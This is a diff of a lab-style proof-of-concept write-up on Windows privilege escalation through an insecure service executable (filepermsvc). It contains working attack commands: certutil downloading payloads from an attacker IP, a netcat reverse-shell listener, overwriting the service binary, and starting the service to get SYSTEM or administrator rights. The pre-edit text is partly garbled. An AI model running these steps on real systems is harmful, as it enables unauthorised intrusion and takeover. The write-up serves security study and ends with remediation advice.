@@ -1,79 +1,121 @@
-# Vulnerability Overview 
-Insecure Service Executables refer to a vulnerability where the executable file (binary) that a Windows service runs has weak permissions, allowing an unprivileged user to modify or replace it. 
-Since services often run with elevated privileges (e.g., SYSTEM), altering the executable can lead to privilege escalation.
+## Proof of Concept: Privilege Escalation via Insecure Service Executables
 
+### Vulnerability Overview
 
+**Insecure Service Executables** is a vulnerability in Windows systems where the executable file (binary) of a service has weak permissions, allowing an unprivileged user to modify or replace it. Since Windows services often run with elevated privileges (e.g., `SYSTEM`), altering the executable can lead to privilege escalation, granting attackers higher-level access to the system.
 
-# POC
-It is important to know that there will be initial access to the target system before the privilege escalation is done. This was carried out by accessing the machine with a user credential and then using on the target CMD `certutil -urlcache -split -f http://10.4.106.235/esc.exe` a malicious file needed for the reverse shell was downloaded on the target, while the attacker machine listened with the command ` nc -nlvp 2294`
+---
 
-![image](https://github.com/user-attachments/assets/ed210457-164b-4e99-b1a3-6730248cad22)
+### Proof of Concept (PoC)
 
-The service "filepermsvc" details were checked out using the following command `sc qc filepermsvc`, and it turned out that the service is running with privileged access `SERVICE_START_NAME: LocalSystem` and the binary path ` BINARY_PATH_NAME: "C:\Program Files\File Permissions Service\filepermservice.exe"`
-![image](https://github.com/user-attachments/assets/99ea3641-0012-477a-8ccc-d65e00f4df42)
+This PoC demonstrates how an unprivileged user can exploit the "Insecure Service Executables" vulnerability to escalate privileges on a target system. The process involves gaining initial access, identifying the vulnerable service, replacing its binary with a malicious executable, and executing the service to achieve elevated privileges.
 
+#### Initial Setup and Access
+- Gained initial access to the target system using user credentials.
+- Established a reverse shell for command execution:
+  - On the attacker machine, set up a listener using Netcat:  
+    ```bash
+    nc -nlvp 2294
+    ```
+  - On the target system, downloaded a malicious executable (`esc.exe`) to create a reverse shell:  
+    ```bash
+    certutil -urlcache -split -f http://10.4.106.235/esc.exe
+    ```
+  - **Result**: Successfully downloaded the malicious file, and the attacker machine received a connection via the reverse shell.  
+    ![Reverse Shell Setup](https://github.com/user-attachments/assets/ed210457-164b-4e99-b1a3-6730248cad22)
 
-The access list on the service's Binary path was then checked out using the command  `C:\PrivEsc\accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe"`
+#### Step 1: Identify the Vulnerable Service
+- Queried the service `filepermsvc` to check its configuration using the following command:  
+  ```bash
+  sc qc filepermsvc
+  ```
+- **Findings**:  
+  - The service runs with elevated privileges: `SERVICE_START_NAME: LocalSystem`.  
+  - The binary path is: `BINARY_PATH_NAME: "C:\Program Files\File Permissions Service\filepermservice.exe"`.  
+  - **Screenshot**: Service Configuration  
+    ![Service Details](https://github.com/user-attachments/assets/99ea3641-0012-477a-8ccc-d65e00f4df42)
 
-1. /accepteula: Automatically accepts the End User License Agreement (EULA) so the tool runs without prompting.
-2. -q: Runs in quiet mode, suppressing unnecessary output like banners.
-3. -u: Only user-level access (not group or system privileges).
-4. -v: Verbose mode, providing detailed output about permissions.
-5. -w: Checks for write permissions specifically.
-6. - C:\PrivEsc\accesschk.exe: This is the path to the accesschk executable.
-7. "C:\Program Files\File Permissions Service\filepermservice.exe": The target file being analyzed
-![Screenshot from 2025-03-19 09-52-02](https://github.com/user-attachments/assets/b24ea522-1fcb-407c-a1c6-0dbded26f5c0)
+#### Step 2: Check Permissions on the Service Binary
+- Used `accesschk.exe` from Sysinternals to analyze permissions on the service binary:  
+  ```bash
+  C:\PrivEsc\accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe"
+  ```
+  - **Command Breakdown**:  
+    - `/accepteula`: Auto-accepts the EULA.  
+    - `-q`: Quiet mode, suppresses banners.  
+    - `-u`: Checks user-level access only.  
+    - `-v`: Verbose output for detailed permissions.  
+    - `-w`: Checks for write permissions.  
+    - `C:\PrivEsc\accesschk.exe`: Path to the tool.  
+    - `"C:\Program Files\File Permissions Service\filepermservice.exe"`: Target binary path.  
+  - **Screenshot**: Access Check Command  
+    ![Access Check Command](https://github.com/user-attachments/assets/b24ea522-1fcb-407c-a1c6-0dbded26f5c0)
 
-The result showed that the user account can read and write into the binary ` RW BUILTIN\Users FILE_ALL_ACCESS`
-![Screenshot from 2025-03-19 08-37-02](https://github.com/user-attachments/assets/8812cb56-968f-493a-8733-af8b11a0e10d)
+- **Result**: The user account has read and write access to the binary: `RW BUILTIN\Users FILE_ALL_ACCESS`, confirming the vulnerability.  
+  - **Screenshot**: Permission Results  
+    ![Permission Results](https://github.com/user-attachments/assets/8812cb56-968f-493a-8733-af8b11a0e10d)
 
-
-Then, I sent two malicious files to the target via the reverse terminal
-1.esc.exe: This malicious file was uploaded on the target using  `certutil -urlcache -split -f http://10.4.106.235/esc.exe`.
-
-After the upload, the file was used to replace the original binary file of the `filepermsvc` service by using the command `copy esc.exe "C:\Program Files\File Permissions Service\filepermservice.exe" /Y`
-![Screenshot from 2025-03-19 08-52-16](https://github.com/user-attachments/assets/85c1e6f0-bf8e-481f-a5f6-5e055be05dc2)
-
-
-
-
-This malicious file was uThis file would give a reverse shell with elevated privileges, and  when the servuice starts running
-With a reverse shell running on 
-![Screenshot from 2025-03-19 08-53-31](https://github.com/user-attachments/assets/2819563c-bbe4-42e7-af9f-29cd6a186274)
-
-
-and it gave a reverse shell with admin privilege
-![Screenshot from 2025-03-19 08-53-31](https://github.com/user-attachments/assets/22f9cc78-800f-43d3-9e7b-d4fe7944b35a)
-
-
-
-# ######################################################################
-
-
-2.x.exe: This file is a windows_service file that was compiled into an exe.. would elevate the privilege of the current user by adding it to the administrator group
- `certutil -urlcache -split -f http://10.4.106.235/x.exe`
-   This was used to upload the file
-![Screenshot from 2025-03-19 08-56-29](https://github.com/user-attachments/assets/e8ea9a11-9260-4faf-858b-9ae83964c9ae)
-
-
-Then we copy using `copy x.exe "C:\Program Files\File Permissions Service\filepermservice.exe" /Y` 
-![Screenshot from 2025-03-19 08-57-40](https://github.com/user-attachments/assets/acb2c733-d030-4cea-a430-e7fc7a986807)
-
-Before running the command, the user had this privilege
-![Screenshot from 2025-03-19 08-58-56](https://github.com/user-attachments/assets/829b828e-8bdd-4d92-abfe-23a8e433bb75)
-
-
-after running `net start permsvc` the user had
-![Screenshot from 2025-03-19 08-58-56](https://github.com/user-attachments/assets/906ade65-553d-4d50-8bb0-2b7e299165b9)
-
-
-4. 
-
-
-
+#### Step 3: Exploit the Vulnerability (Method 1 - Reverse Shell)
+- Uploaded the malicious file `esc.exe` to the target system (already downloaded in the initial setup).  
+- Replaced the original service binary with the malicious file:  
+  ```bash
   copy esc.exe "C:\Program Files\File Permissions Service\filepermservice.exe" /Y
+  ```
+  - `/Y`: Overwrites the file without prompting.  
+  - **Screenshot**: File Replacement  
+    ![File Replacement](https://github.com/user-attachments/assets/85c1e6f0-bf8e-481f-a5f6-5e055be05dc2)
 
+- Started the service to execute the malicious binary:  
+  ```bash
+  net start filepermsvc
+  ```
+- **Result**: The service executed `esc.exe`, which established a reverse shell with `SYSTEM` privileges on the attacker machine.  
+  - **Screenshots**: Reverse Shell with Admin Privileges  
+    ![Reverse Shell Active](https://github.com/user-attachments/assets/2819563c-bbe4-42e7-af9f-29cd6a186274)  
+    ![Admin Privileges Confirmed](https://github.com/user-attachments/assets/22f9cc78-800f-43d3-9e7b-d4fe7944b35a)
 
+#### Step 4: Exploit the Vulnerability (Method 2 - Add User to Admin Group)
+- Uploaded a second malicious file, `x.exe`, a compiled Windows service binary designed to add the current user to the Administrator group:  
+  ```bash
+  certutil -urlcache -split -f http://10.4.106.235/x.exe
+  ```
+  - **Screenshot**: File Upload  
+    ![File Upload](https://github.com/user-attachments/assets/e8ea9a11-9260-4faf-858b-9ae83964c9ae)
 
-net start filepermsvc
+- Replaced the service binary with `x.exe`:  
+  ```bash
+  copy x.exe "C:\Program Files\File Permissions Service\filepermservice.exe" /Y
+  ```
+  - **Screenshot**: File Replacement  
+    ![File Replacement](https://github.com/user-attachments/assets/acb2c733-d030-4cea-a430-e7fc7a986807)
+
+- Checked the user’s privileges before executing the service:  
+  - **Screenshot**: Initial User Privileges  
+    ![Initial Privileges](https://github.com/user-attachments/assets/829b828e-8bdd-4d92-abfe-23a8e433bb75)
+
+- Started the service to execute the malicious binary:  
+  ```bash
+  net start filepermsvc
+  ```
+- **Result**: The service executed `x.exe`, adding the user to the Administrator group, successfully escalating privileges.  
+  - **Screenshot**: Updated User Privileges  
+    ![Updated Privileges](https://github.com/user-attachments/assets/906ade65-553d-4d50-8bb0-2b7e299165b9)
+
+---
+
+### Summary of Findings
+
+- The `filepermsvc` service binary had insecure permissions, allowing the `BUILTIN\Users` group to modify it (`FILE_ALL_ACCESS`).  
+- Two methods were used to exploit this vulnerability:  
+  1. Replaced the binary with `esc.exe`, gaining a reverse shell with `SYSTEM` privileges.  
+  2. Replaced the binary with `x.exe`, adding the user to the Administrator group.  
+- Both methods successfully escalated privileges, demonstrating the severity of the vulnerability.
+
+---
+
+### Conclusion
+
+This PoC confirms that the "Insecure Service Executables" vulnerability in the `filepermsvc` service allows an unprivileged user to escalate privileges to `SYSTEM` or Administrator level. By exploiting weak permissions on the service binary, attackers can execute arbitrary code with elevated privileges, posing a significant risk to system security. Immediate remediation is recommended, such as restricting permissions on service binaries and ensuring services run with the least privilege necessary.
+
+---
 
